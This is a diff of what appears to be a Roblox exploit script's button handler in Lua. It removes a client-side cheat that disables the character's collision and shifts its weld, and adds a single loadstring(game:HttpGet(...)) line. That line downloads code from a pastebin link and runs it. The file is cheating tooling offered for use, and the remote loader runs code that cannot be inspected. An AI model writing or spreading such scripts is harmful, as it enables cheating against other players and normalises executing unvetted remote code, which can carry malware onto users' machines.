@@ -206,46 +206,8 @@ Button1.TextScaled = true
 Button1.TextSize = 14.000
 Button1.TextWrapped = true
 Button1.MouseButton1Down:connect(function()
-	 a = 1
-b = false
-local character = game.Players.LocalPlayer.Character
-originalC0 = character.Collision.Weld.C0
-local tool = game:GetObjects("rbxassetid://13396696368")[1]
-tool.Parent = game.Players.LocalPlayer.Backpack
-
-tool.Activated:Connect(function()
-if a == 1 then do
-a = a + 1
-for i = 1, 2 do
-task.wait()
-tool.Handle.Part:Destroy()
-local character = game.Players.LocalPlayer.Character
-local collision = character.Collision
-collision.CanCollide = false
-weld = collision:FindFirstChildOfClass('ManualWeld')
-local number = 0
-local numberr = 10
-local numberrr = 0.2
-b = true
-weld.C0 = CFrame.new(number, numberr, numberrr)
-task.wait(120)
-a = a + 1
-
-end end end end)
-while true do
-task.wait()
-if a == 3 then
-a = a + 1
-task.wait()
-oldpos = character:GetPivot() 
-local char = game.Players.LocalPlayer.Character 
-local collision = char.Collision
- collision.CanCollide = true 
-eld = collision.Weld 
-eld.C0 = originalC0 
-wait(.1)
- char:PivotTo(oldpos)
- end end
+	 
+loadstring(game:HttpGet('https://pastebin.com/raw/pxaWJxV7'))()
 
 end)
 
